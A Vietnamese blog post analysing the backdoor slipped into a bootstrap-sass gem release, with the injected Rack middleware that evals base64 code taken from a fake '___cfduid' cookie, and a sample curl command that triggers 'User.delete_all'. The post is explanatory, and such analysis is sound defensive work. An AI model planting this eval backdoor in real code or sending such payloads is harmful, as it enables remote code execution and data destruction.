---
layout: post
title:  "Remote code execution backdoor"
date:   2019-04-12 23:54:00 +0700
categories: [rails, security, backdoor, middleware]
---

Tình cờ đọc được một issue trên repo [bootstrap-sass]( https://github.com/twbs/bootstrap-sass/issues/1195) thì biết được cách tạo một backdoor khá hay nên quyết định tìm hiểu.

Phiên bản chứa backdoor được released do một trong số các authors của thư viện bị lộ secret token. Attacker đã released bản này lên rubygems nên khi users upgrade đã dính phải.

Đại khái attacker sẽ inject một đoạn mã vào tầng Rack middleware, cụ thể ở đây sẽ là `Rack::Sendfile` middleware.

```ruby
def call(env)  
  begin
    x = Base64.urlsafe_decode64(env['http_cookie'.upcase].scan(/___cfduid=(.+);/).flatten[0].to_s)
    eval(x) if x
  rescue Exception
  end
  @app.call(env)
end
```

Đoạn mã trên filter đoạn mã thực thi của attacker gửi lên đính kèm trong cookie. Cụ thể ở đây là key có tên là `___cfduid`(Tên này được đặt giống theo tên của một cookie tương tự của [cloudflare](https://support.cloudflare.com/hc/en-us/articles/200170156-What-does-the-CloudFlare-cfduid-cookie-do-), chỉ khác nhau là 3 dấu gạch dưới thay vì 2, làm cho người dùng nhìn vào có thể nhầm lẫn đây là cookie của cloudflare). Đoạn thực thi đã được mã hoá base64 (để tránh sự nghi ngờ bằng mắt thường). Sử dụng hàm `scan` để tách chiết giá trị. Sau đó sử dụng lệnh eval để thực thi đoạn mã chứa trong string đó.

Giả dụ Attacker mặc nhiên biết có một table có tên là `users`. Anh ta muốn xoá dữ liệu ở bảng này.

```ruby
User.delete_all
Base64.encode64("User.delete_all") # VXNlci5kZWxldGVfYWxs
```

Truyền đoạn mã trên lên server thông qua cookie

```shell
curl -v --cookie "___cfduid=VXNlci5kZWxldGVfYWxs; user_id=abc123" http://example.com/users
```

```ruby
x = Base64.urlsafe_decode64(env['http_cookie'.upcase].scan(/___cfduid=(.+);/).flatten[0].to_s)
```

x sẽ nhận được giá trị là `User.delete_all` và sau đó sẽ xoá sạch dữ liệu của bảng users trước khi response về.

Bài học có thể rút ra ở đây là khi nâng cấp thư viện, chúng ta nên kiểm tra lại xem version đó có trên github repo không và chịu khó kiểm tra những thay đổi, cập nhật là gì. Mặc dù hơi tốn công một chút nhưng an toàn vẫn hơn.
